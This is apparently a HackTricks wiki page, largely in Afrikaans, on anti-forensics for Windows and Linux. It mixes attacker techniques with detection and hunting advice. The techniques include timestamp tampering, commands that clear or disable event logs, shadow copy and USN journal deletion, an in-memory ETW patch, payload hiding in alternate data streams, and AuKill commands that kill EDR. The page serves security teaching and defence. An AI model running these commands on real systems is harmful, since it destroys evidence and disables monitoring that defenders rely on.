# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## Timestamps

'n Aanvaller kan belangstel om **die timestamps van lêers te verander** om te voorkom dat dit opgespoor word.\
Dit is moontlik om die timestamps binne die MFT in die attribute `$STANDARD_INFORMATION` \_\_ en \_\_ `$FILE_NAME` te vind.

Albei attribute het 4 timestamps: **Modification**, **access**, **creation**, en **MFT registry modification** (MACE of MACB).

**Windows explorer** en ander tools wys die information vanaf **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensic Tool

Hierdie tool **verander** die timestamp-information binne **`$STANDARD_INFORMATION`**, maar **nie** die information binne **`$FILE_NAME`** nie. Daarom is dit moontlik om **suspicious** **activity** te **identifiseer**.

### Usnjrnl

Die **USN Journal** (Update Sequence Number Journal) is 'n feature van NTFS (Windows NT file system) wat rekord hou van volume-veranderinge. Die [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv)-tool laat die ondersoek van hierdie veranderinge toe.

![TimeStomp - Anti-forensic Tool - Usnjrnl: The USN Journal (Update Sequence Number Journal) is a feature of the NTFS (Windows NT file system) that keeps track of volume changes. The...](<../../images/image (801).png>)

Die vorige image is die **output** wat deur die **tool** gewys word, waar gesien kan word dat sommige **veranderinge aangebring is** aan die file.

### $LogFile

**Alle metadata-veranderinge aan 'n file system word aangeteken** in 'n proses bekend as [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Die aangetekende metadata word gehou in 'n file genaamd `**$LogFile**`, geleë in die root directory van 'n NTFS file system. Tools soos [LogFileParser](https://github.com/jschicht/LogFileParser) kan gebruik word om hierdie file te parse en veranderinge te identifiseer.

![Usnjrnl - $LogFile: All metadata changes to a file system are logged in a process known as write-ahead logging. The logged metadata is kept in a file named $LogFile , located in the root...](<../../images/image (137).png>)

Weereens is dit in die output van die tool moontlik om te sien dat **sommige veranderinge aangebring is**.

Deur dieselfde tool te gebruik, is dit moontlik om te identifiseer **na watter tyd die timestamps verander is**:

![Usnjrnl - $LogFile: Using the same tool it's possible to identify to which time the timestamps were modified](<../../images/image (1089).png>)

- CTIME: File se creation time
- ATIME: File se modification time
- MTIME: File se MFT registry modification
- RTIME: File se access time

### `$STANDARD_INFORMATION` and `$FILE_NAME` comparison

'n Ander manier om suspicious modified files te identifiseer, is om die tyd op albei attribute te vergelyk en na **mismatches** te soek.

### Nanoseconds

**NTFS** timestamps het 'n **precision** van **100 nanoseconds**. Daarom is dit baie suspicious om files met timestamps soos 2010-10-10 10:10:**00.000:0000 te vind**.

### SetMace - Anti-forensic Tool

Hierdie tool kan albei attribute, `$STARNDAR_INFORMATION` en `$FILE_NAME`, verander. Vanaf Windows Vista is dit egter nodig dat 'n live OS hierdie information verander.

## Data Hiding

NFTS gebruik 'n cluster en die minimum information size. Dit beteken dat indien 'n file een en 'n half cluster gebruik, die **oorblywende helfte nooit gebruik gaan word** totdat die file deleted is nie. Daarom is dit moontlik om **data in hierdie slack space te versteek**.

Daar is tools soos slacker wat dit moontlik maak om data in hierdie "hidden" space te versteek. 'n Analise van die `$logfile` en `$usnjrnl` kan egter wys dat data bygevoeg is:

![SetMace - Anti-forensic Tool - Data Hiding: There are tools like slacker that allow hiding data in this "hidden" space. However, an analysis of the $logfile and $usnjrnl can show that...](<../../images/image (1060).png>)

Daarna is dit moontlik om die slack space met tools soos FTK Imager te retrieve. Let daarop dat hierdie soort tool die content obfuscated of selfs encrypted kan stoor.

## UsbKill

Dit is 'n tool wat die **computer sal afskakel indien enige verandering in die USB**-poorte bespeur word.\
'n Manier om dit te ontdek, is om die lopende prosesse te inspekteer en **elke python script wat loop te hersien**.

## Live Linux Distributions

Hierdie distros word **binne die RAM**-memory **uitgevoer**. Die enigste manier om hulle te detect, is **indien die NTFS file-system met write permissions gemount is**. Indien dit slegs met read permissions gemount is, sal dit nie moontlik wees om die intrusion te detect nie.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

Dit is moontlik om verskeie Windows logging methods te disable om die forensics-ondersoek baie moeiliker te maak.

### Disable Timestamps - UserAssist

Dit is 'n registry key wat datums en tye byhou van wanneer elke executable deur die user uitgevoer is.

Om UserAssist te disable, vereis twee stappe:

1. Stel twee registry keys, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` en `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, albei op zero om aan te dui dat ons UserAssist disabled wil hê.
2. Clear jou registry-subtrees wat lyk soos `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Disable Timestamps - Prefetch

Dit stoor information oor die applications wat uitgevoer is met die doel om die performance van die Windows system te verbeter. Dit kan egter ook nuttig wees vir forensics-praktyke.

- Execute `regedit`
- Select die file path `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Regsklik op beide `EnablePrefetcher` en `EnableSuperfetch`
- Select Modify op elk hiervan om die value van 1 (of 3) na 0 te verander
- Restart

### Disable Timestamps - Last Access Time

Wanneer 'n folder vanaf 'n NTFS-volume op 'n Windows NT-server oopgemaak word, neem die system die tyd om 'n **timestamp field op elke gelyste folder te update**, genaamd die last access time. Op 'n intensief gebruikte NTFS-volume kan dit performance beïnvloed.

1. Open die Registry Editor (Regedit.exe).
2. Browse na `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Soek `NtfsDisableLastAccessUpdate`. Indien dit nie bestaan nie, voeg hierdie DWORD by en stel sy value op 1, wat die proses sal disable.
4. Close die Registry Editor en reboot die server.

### Delete USB History

Al die **USB Device Entries** word in die Windows Registry gestoor onder die **USBSTOR** registry key, wat sub keys bevat wat geskep word wanneer jy 'n USB Device by jou PC of Laptop inprop. Jy kan hierdie key hier vind: H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. Deur **dit te delete**, sal jy die USB history delete.\
Jy kan ook die tool [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) gebruik om seker te maak dat jy hulle deleted het (en om hulle te delete).

'n Ander file wat information oor die USBs stoor, is die file `setupapi.dev.log` binne `C:\Windows\INF`. Dit behoort ook deleted te word.

### Disable Shadow Copies

**List** shadow copies met `vssadmin list shadowstorage`\
**Delete** hulle deur `vssadmin delete shadow` uit te voer

Jy kan hulle ook via die GUI delete deur die stappe te volg wat voorgestel word in [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Om shadow copies te disable, [steps from here](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Open die Services-program deur "services" in die text search box te tik nadat jy die Windows start button geklik het.
2. Vind "Volume Shadow Copy" in die lys, select dit en open dan Properties deur regs te klik.
3. Kies Disabled uit die "Startup type"-drop-down menu en bevestig dan die verandering deur Apply en OK te klik.

Dit is ook moontlik om die configuration van watter files in die shadow copy gekopieer gaan word in die registry `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` te verander.

### Overwrite deleted files

- Jy kan 'n **Windows tool** gebruik: `cipher /w:C`. Dit sal cipher aandui om enige data uit die beskikbare ongebruikte disk space binne die C-drive te remove.
- Jy kan ook tools soos [**Eraser**](https://eraser.heidi.ie) gebruik.

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> Expand "Windows Logs" --> Regsklik op elke category en select "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Disable die service "Windows Event Log" binne die services-afdeling
- `WEvtUtil.exec clear-log` of `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Onlangse weergawes van Windows 10/11 en Windows Server hou **uitgebreide PowerShell-forensics artifacts** onder
`Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106).
Aanvallers kan dit on-the-fly disable of wipe:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Defenders should monitor for changes to those registry keys and high-volume removal of PowerShell events.

### ETW (Event Tracing for Windows) Patch

Endpoint-sekuriteitsprodukte maak sterk staat op ETW. ’n Gewilde ontduikingsmetode in 2024 is om `ntdll!EtwEventWrite`/`EtwEventWriteFull` in die geheue te patch sodat elke ETW-oproep `STATUS_SUCCESS` terugstuur sonder om die gebeurtenis uit te stuur:
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Publieke PoCs (bv. `EtwTiSwallow`) implementeer dieselfde primitive in PowerShell of C++.
Omdat die patch **process-local** is, kan EDRs wat binne ander prosesse loop dit mis.
Detection: vergelyk `ntdll` in memory met die een op disk, of hook voor user-mode.

### Herlewing van Alternate Data Streams (ADS)

Malware campaigns in 2023 (bv. **FIN12** loaders) is al gesien waar hulle second-stage binaries
binne ADS stage om buite die sig van tradisionele scanners te bly:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Enumerate streams with `dir /R`, `Get-Item -Stream *`, or Sysinternals `streams64.exe`.
Copying the host-lêer na FAT/exFAT of via SMB sal die hidden stream verwyder en kan deur
ondersoekers gebruik word om die payload te herwin.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver word nou gereeld vir **anti-forensics** in ransomware-
indringings gebruik.
Die open-source tool **AuKill** laai ’n ondertekende maar kwesbare driver (`procexp152.sys`) om
EDR- en forensiese sensors **voor encryption & log destruction** op te skort of te beëindig:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Die driver word daarna verwyder, wat minimale artefakte agterlaat.<sup>[[1]](#references)</sup>
Versagtings: enable the Microsoft vulnerable-driver blocklist (HVCI/SAC),
en genereer alerts oor kernel-service creation vanaf user-writable paths.

---

## Linux Anti-Forensics: Self-Patching en Cloud C2 (2023–2025)

### Self-patching van compromised services om detection te verminder (Linux)
Adversaries doen toenemend “self-patch” aan ’n service onmiddellik nadat hulle dit geëksploiteer het, om sowel her-eksploitasie te voorkom as vulnerability-based detections te onderdruk. Die idee is om vulnerable components met die nuutste legitimate upstream binaries/JARs te vervang, sodat scanners die host as patched rapporteer terwyl persistence en C2 voortduur.<sup>[[3]](#references)</sup>

Voorbeeld: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)<sup>[[3]](#references)[[4]](#references)</sup>
- Ná post-exploitation het attackers legitimate JARs vanaf Maven Central (repo1.maven.org) afgelaai, vulnerable JARs in die ActiveMQ-installation uitgevee en die broker herbegin.
- Dit het die aanvanklike RCE gesluit terwyl ander footholds (cron, SSH config changes, afsonderlike C2 implants) behoue gebly het.

Operational example (illustrative)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forensiese/hunting-wenke
- Hersien diensgidse vir ongeskeduleerde vervangings van binaries/JARs:
- Debian/Ubuntu: `dpkg -V activemq` en vergelyk lêer-hashes/-paaie met repo-spieëls.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Soek na JAR-weergawes wat op die skyf voorkom maar nie deur die package manager besit word nie, of simboliese skakels wat buite die normale proses opgedateer is.
- Tydlyn: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` om ctime/mtime met die kompromitteringsvenster te korreleer.
- Shell history/proses-telemetrie: bewyse van `curl`/`wget` na `repo1.maven.org` of ander artifact-CDNs onmiddellik ná aanvanklike exploitasie.
- Change management: valideer wie die “patch” toegepas het en waarom, nie slegs dat ’n patched weergawe teenwoordig is nie.

### Cloud-diens C2 met bearer tokens en anti-analysis stagers
Waargenome tradecraft het verskeie langafstand-C2-paaie en anti-analysis-packaging gekombineer:<sup>[[3]](#references)</sup>
- Wagwoordbeskermde PyInstaller ELF-loaders om sandboxing en static analysis te bemoeilik (bv. encrypted PYZ, tydelike ekstraksie onder `/_MEI*`).
- Indicators: `strings`-treffers soos `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Runtime artifacts: ekstraksie na `/tmp/_MEI*` of pasgemaakte `--runtime-tmpdir`-paaie.
- Dropbox-backed C2 met hardcoded OAuth Bearer tokens
- Network markers: `api.dropboxapi.com` / `content.dropboxapi.com` met `Authorization: Bearer <token>`.
- Hunt in proxy/NetFlow/Zeek/Suricata vir uitgaande HTTPS na Dropbox-domains vanaf server-workloads wat normaalweg nie lêers sync nie.
- Parallelle/backup-C2 via tunneling (bv. Cloudflare Tunnel `cloudflared`), om beheer te behou indien een kanaal geblokkeer word.
- Host IOCs: `cloudflared`-prosesse/-units, config by `~/.cloudflared/*.json`, uitgaande 443 na Cloudflare-edges.

### Persistence en “hardening rollback” om toegang te behou (Linux-voorbeelde)
Aanvallers kombineer self-patching gereeld met volhoubare toegangspaaie:<sup>[[3]](#references)</sup>
- Cron/Anacron: wysigings aan die `0anacron`-stub in elke `/etc/cron.*/`-gids vir periodieke uitvoering.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: aktivering van root-logins en wysiging van default shells vir accounts met lae privileges.
- Hunt vir root-login-aktivering:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Hunt vir verdagte interactive shells op system accounts (bv. `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Ewekansige beacon-artifacts met kort name (8 alfabetiese karakters) wat op die skyf neergesit word en ook met cloud C2 kommunikeer:
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders behoort hierdie artifacts met eksterne blootstelling en service-patching events te korreleer om anti-forensic self-remediation te onthul wat gebruik word om aanvanklike exploitasie te verberg.

## References

- [1] [Sophos X-Ops – AuKill: A Weaponized Vulnerable Driver for Disabling EDR (March 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite for Stealth: Detection & Hunting (June 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
